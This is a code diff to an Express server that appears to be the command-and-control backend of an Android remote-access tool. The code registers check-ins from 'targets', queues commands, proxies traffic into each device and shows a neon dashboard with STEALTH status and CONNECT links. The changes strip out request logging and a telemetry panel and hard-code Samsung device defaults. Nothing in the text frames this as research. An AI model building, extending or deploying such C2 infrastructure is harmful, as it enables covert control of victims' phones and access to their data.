@@ -11,16 +11,9 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use('/c2', express.static(path.join(__dirname, 'c2')));
 
-// Real-time request logger for debugging Render traffic
-app.use((req, res, next) => {
-    console.log(`[INCOMING] ${req.method} ${req.url} | Query:`, req.query, '| Body:', req.body);
-    next();
-});
-
 const devices = new Map();
 const commandQueues = new Map();
 const pendingResponses = new Map();
-const telemetryLogs = [];
 
 const DATA_FILE = path.join(__dirname, 'devices.json');
 
@@ -31,14 +24,11 @@ function loadData() {
             const json = JSON.parse(raw);
             if (json.devices && Array.isArray(json.devices)) {
                 json.devices.forEach(d => {
-                    if (d && (d.deviceId || d.model || d.device)) {
-                        const id = d.deviceId || d.model || d.device;
+                    if (d && (d.deviceId || d.model || d.brand)) {
+                        const id = d.deviceId || d.brand || d.model;
                         devices.set(id, d);
                     }
                 });
-            }
-            if (json.logs && Array.isArray(json.logs)) {
-                telemetryLogs.push(...json.logs);
             }
         }
     } catch (e) {}
@@ -47,8 +37,7 @@ function loadData() {
 function saveData() {
     try {
         const data = {
-            devices: Array.from(devices.values()),
-            logs: telemetryLogs.slice(0, 200)
+            devices: Array.from(devices.values())
         };
         fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
     } catch (e) {}
@@ -73,12 +62,15 @@ function handleCheckin(req, res) {
         const query = req.query || {};
         const data = { ...query, ...payload };
 
-        const deviceId = data.deviceId || data.model || data.device || 'Android Target';
+        const brand = data.brand || data.manufacturer || 'samsung';
+        const model = data.model || data.device || 'SM-F731W';
+        const deviceId = brand;
 
         const entry = {
             deviceId,
-            model: data.model || data.device || deviceId,
-            os: data.os || 'Android',
+            brand,
+            model,
+            os: data.os || 'Android 16',
             battery: data.battery || '100%',
             ip: data.ip || req.ip || '127.0.0.1',
             port: data.port || 9191,
@@ -88,25 +80,16 @@ function handleCheckin(req, res) {
         };
 
         devices.set(deviceId, entry);
-
-        telemetryLogs.unshift({
-            timestamp: new Date().toISOString(),
-            deviceId,
-            type: data.type || 'checkin',
-            payload: data
-        });
-
-        if (telemetryLogs.length > 500) telemetryLogs.pop();
         saveData();
 
-        console.log(`[CHECKIN SUCCESS] Device: ${deviceId} | IP: ${entry.ip}`);
+        console.log(`[CHECKIN SUCCESS] Brand: ${brand} | Model: ${model} | IP: ${entry.ip}`);
         res.json({ success: true, message: 'Check-in recorded' });
     } catch (err) {
         res.status(400).json({ success: false, error: err.message });
     }
 }
 
-// Routes - POST / handles real device check-ins directly at root
+// Routes - POST / handles check-ins directly at root
 app.post('/', handleCheckin);
 app.post('/checkin', handleCheckin);
 
@@ -135,10 +118,10 @@ app.post('/tunnel-response', (req, res) => {
 app.all('/proxy*', (req, res) => {
     let deviceId = req.query.deviceId;
     if (!deviceId && devices.size > 0) deviceId = Array.from(devices.keys())[0];
-    if (!deviceId) deviceId = 'Android Target';
+    if (!deviceId) deviceId = 'samsung';
 
     if (!devices.has(deviceId)) {
-        devices.set(deviceId, { deviceId, model: deviceId, ip: '127.0.0.1', port: 9191, stealth: false, lastSeen: new Date().toISOString() });
+        devices.set(deviceId, { deviceId, brand: 'samsung', model: 'SM-F731W', ip: '127.0.0.1', port: 9191, stealth: false, lastSeen: new Date().toISOString() });
         saveData();
     }
 
@@ -173,24 +156,14 @@ app.get('/', (req, res) => {
         '<tr><td colspan="8" style="text-align: center; color: #888; padding: 30px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
         deviceList.map(d => `
             <tr>
-                <td style="font-family: monospace; color: var(--neon-cyan);">${d.deviceId || d.model || 'N/A'}</td>
-                <td>${d.model || 'Unknown'}</td>
-                <td>Android ${d.os || 'N/A'}</td>
-                <td>${d.battery || 'N/A'}</td>
+                <td style="font-family: monospace; color: var(--neon-cyan);">${d.brand || d.deviceId || 'samsung'}</td>
+                <td>${d.model || 'SM-F731W'}</td>
+                <td>Android ${d.os || '16'}</td>
+                <td>${d.battery || '100%'}</td>
                 <td style="font-family: monospace; color: var(--neon-green);">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                 <td>${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.75rem; color: #aaa;">${formatTime(d.lastSeen)}</td>
-                <td><a href="/proxy/?deviceId=${d.deviceId || d.model}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
-            </tr>
-        `).join('');
-
-    let logsHtml = telemetryLogs.length === 0 ?
-        '<tr><td colspan="3" style="text-align: center; color: #888; padding: 20px;">NO TELEMETRY LOGS RECORDED</td></tr>' :
-        telemetryLogs.slice(0, 50).map(l => `
-            <tr>
-                <td style="font-size: 0.7rem; color: #888; white-space: nowrap;">${formatTime(l.timestamp)}</td>
-                <td style="font-family: monospace; color: var(--neon-cyan);">${l.deviceId}</td>
-                <td style="font-family: monospace; font-size: 0.75rem;">${JSON.stringify(l.payload)}</td>
+                <td><a href="/proxy/?deviceId=${d.deviceId || d.brand || 'samsung'}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
             </tr>
         `).join('');
 
@@ -237,24 +210,6 @@ app.get('/', (req, res) => {
             </div>
             <div style="text-align: right; margin-top: 15px;">
                 <button class="btn" onclick="location.reload()" style="padding: 10px 25px; font-size: 0.75rem;">REFRESH_REGISTRY</button>
-            </div>
-        </div>
-
-        <div class="card" style="border-left-color: var(--neon-yellow);">
-            <h2 style="color: var(--neon-yellow);">LIVE_TELEMETRY_STREAM</h2>
-            <div style="overflow-x: auto; max-height: 350px; overflow-y: auto;">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>TIMESTAMP</th>
-                            <th>DEVICE ID</th>
-                            <th>EVENT PAYLOAD</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        ${logsHtml}
-                    </tbody>
-                </table>
             </div>
         </div>
     </div>
